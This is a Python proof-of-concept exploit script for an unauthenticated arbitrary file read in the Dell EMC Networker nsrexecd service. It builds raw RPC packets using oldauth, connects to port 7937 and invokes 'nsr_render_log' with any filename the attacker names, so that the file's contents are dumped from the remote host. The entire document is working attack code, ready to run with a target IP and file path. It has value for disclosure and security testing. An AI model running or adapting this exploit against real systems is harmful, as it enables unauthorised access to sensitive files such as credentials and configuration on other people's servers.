#!/usr/bin/env python3
'''
Proof of concept for unauthenticated arbitrary file read affecting
Dell EMC Networker nsr_render_log.

The script connects to nsrexecd remotely as administrative user using
oldauth and call 'nsr_render_log' script with arbitrary filename
in order to dump it from the remote system.

Author: Quentin Kaiser <kaiserquentin@gmail.com>
'''
import sys
import socket
import struct
import re

def add_header(rpc_request):
    '''compute RPC header'''
    rpc_header = struct.pack(">I", 0x80000000 + len(rpc_request))
    return rpc_header + rpc_request

def pad(content, pad_len=4):
    '''4 bytes wide padding'''
    return content + b"\x00" * (pad_len - (len(content) % pad_len))

def rpc_base(oldauth=True):
    '''craft RPC base request'''

    client_hostname = b"\x00" * 16

    # craft_rpc_header
    rpc_request = b""
    rpc_request += struct.pack(">I", 0x5ebb5810) # XID
    rpc_request += struct.pack(">I", 0x00000000) # message_type
    rpc_request += struct.pack(">I", 0x00000002) # rpc version
    rpc_request += struct.pack(">I", 0x0005f3e1) # rpc program
    rpc_request += struct.pack(">I", 0x00000001) # program version
    rpc_request += struct.pack(">I", 0x00000006) # rpc procedure
    rpc_request += struct.pack(">I", 0x00000001) # unknown
    rpc_request += struct.pack(">I", 0x00000030) # unknown
    rpc_request += struct.pack(">I", 0x5ebb5810) # XID

    if oldauth:
        # oldauth, we add the client hostname
        rpc_request += struct.pack(">I", len(client_hostname))
        rpc_request += pad(client_hostname, pad_len=4)

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000000) # length
        rpc_request += struct.pack(">I", 0x00000002) # value

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000000) # length
        rpc_request += struct.pack(">I", 0x00000000) # value

        # TLV
        rpc_request += struct.pack(">I", 0x00000000) # type
        rpc_request += struct.pack(">I", 0x00000001) # length
        rpc_request += struct.pack(">I", 0x00000071) # value

        # unknown
        rpc_request += struct.pack(">I", 0x00000001) # ?
    return rpc_request

def craft_rpc_request(command):
    '''craft rpc command request'''

    instruction = b"command"

    rpc_request = rpc_base()
    # TLV (instruction)
    rpc_request += struct.pack(">I", 0x00000001) # type
    rpc_request += struct.pack(">I", len(instruction)) # length
    rpc_request += pad(instruction)

    # TLV (command)
    rpc_request += struct.pack(">I", 0x00000001) # type
    rpc_request += struct.pack(">I", len(command)) # length
    rpc_request += pad(command)

    rpc_request += struct.pack(">I", 0x00000000)
    rpc_request += struct.pack(">I", 0x00000000)

    rpc_payload = add_header(rpc_request)
    return rpc_payload

def confirm_payload():
    '''confirmation payload'''
    payload = b""
    payload += struct.pack(">I", 0x00000007)
    payload += struct.pack(">I", 0x00000000)
    payload += struct.pack(">I", 0x00000001)
    payload += struct.pack(">I", 0x00000001)
    payload += struct.pack(">I", 0x00000000)
    return payload

def read_file(host, filename):
    '''read file filename from host by exploiting path traversal'''
    output = b""
    command = "nsr_render_log {}".format(filename).encode('utf-8')
    payload = craft_rpc_request(command)

    command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    command_socket.connect((host, 7937))
    command_socket.sendall(payload)
    data = command_socket.recv(1024)
    command_socket.sendall(confirm_payload())
    while True:
        data = command_socket.recv(1024)
        output += data
        if b"\x80\x00\x00\x03\x00\x00\x00\x01" in data:
            command_socket.close()
            break
    command_socket.close()
    return output

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: {} target_ip filename".format(sys.argv[0]))
        sys.exit(-1)

    rpc_response = read_file(sys.argv[1], sys.argv[2])
    matches = re.findall(b"LOG unrendered ([^\n]*)", rpc_response)
    print(b"\n".join(matches).decode('utf-8'))
